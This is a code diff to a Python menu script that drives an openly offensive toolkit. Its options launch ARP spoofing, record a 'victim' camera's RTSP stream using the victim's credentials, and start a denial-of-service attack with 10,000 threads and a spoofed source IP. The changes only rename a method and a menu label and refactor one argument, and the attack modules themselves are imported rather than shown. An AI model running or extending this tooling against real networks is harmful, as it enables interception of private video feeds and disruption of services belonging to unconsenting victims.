@@ -30,18 +30,19 @@ class Menu:
         self.running_tasks.append(spoof_thread)
         print("ARP spoofing started...")
 
-    def run_network_recording(self):
+    def run_stream_recording(self):
         from record_stream import StreamRecorder
         target_info = self.loader.load_targets()
         victim_ip = target_info['victim']
         username = target_info['username']
         password = target_info['password']
         url = f"rtsp://{username}:{password}@{victim_ip}/channel1"
-        recorder = StreamRecorder(url, format='mkv')
+        recorder = StreamRecorder(url)  # Format argument removed
         record_thread = threading.Thread(target=recorder.record)
         record_thread.start()
         self.running_tasks.append(record_thread)
         print("Network recording started...")
+
 
     def run_dos_attack(self):
         from DOS import DOSAttack
@@ -51,7 +52,9 @@ class Menu:
         except ValueError:
             print("Invalid input! Using default duration of 60 seconds.")
             duration = 60
-        dos = DOSAttack(target=target_info['victim'], port=8080, thread_count=10000, fake_ip='44.197.175.168',
+
+        thread_count = 10000
+        dos = DOSAttack(target=target_info['victim'], port=8080, thread_count=thread_count, fake_ip='44.197.175.168',
                         duration=duration)
         dos_thread = threading.Thread(target=dos.start_attack)
         dos_thread.start()
@@ -61,7 +64,7 @@ class Menu:
     def display_menu(self):
         print("\n\nSelect an option:")
         print("1. Run ARP Spoofing")
-        print("2. Run Network Recording")
+        print("2. Run Stream Recording")
         print("3. Run DOS Attack")
         print("4. Stop all tasks and Exit")
 
@@ -69,7 +72,7 @@ class Menu:
         if choice == '1':
             self.run_arp_spoofing()
         elif choice == '2':
-            self.run_network_recording()
+            self.run_stream_recording()
         elif choice == '3':
             self.run_dos_attack()
         elif choice == '4':
